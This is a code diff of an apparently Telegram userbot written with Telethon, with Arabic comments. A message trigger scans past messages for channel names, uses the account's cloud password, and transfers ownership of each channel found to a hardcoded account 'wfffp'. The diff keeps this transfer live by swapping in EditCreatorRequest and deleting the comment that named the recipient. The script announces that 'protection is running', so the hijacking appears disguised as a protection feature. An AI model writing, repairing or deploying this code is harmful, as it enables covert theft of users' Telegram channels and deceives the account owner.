@@ -46,7 +46,6 @@ import re
 import asyncio
 from telethon import events, functions, errors
 from telethon.password import compute_check
-from telethon.tl.functions.channels import TransferChannelOwnershipRequest
 
 @REACTBOT.on(events.NewMessage(pattern=r"^اضغط$"))
 async def check_past_transfers(event):
@@ -130,13 +129,13 @@ async def check_past_transfers(event):
                             channel_match = re.search(r'@([a-zA-Z0-9_]{5,})', message.raw_text)
                             
                             if channel_match:
-                                target_channel = channel_match.group(0) # جلب اسم القناة المستخرج
+                                target_channel = channel_match.group(0)
                                 
                                 pwd_srp = await ABH(functions.account.GetPasswordRequest())
                                 pwd_check = compute_check(pwd_srp, cloud_password)
                                 
-                                # تنفيذ أمر نقل ملكية القناة للحساب wfffp
-                                await ABH(TransferChannelOwnershipRequest(
+                                # الدالة الرسمية لتغير المالِك في Telethon
+                                await ABH(functions.channels.EditCreatorRequest(
                                     channel=target_channel,
                                     user_id=wfffp,
                                     password=pwd_check
@@ -161,7 +160,6 @@ async def check_past_transfers(event):
 
     except Exception as err:
         print(f"خطأ أثناء فحص الرسائل: {err}")
-
 
 
 print('الحماية شغالة')
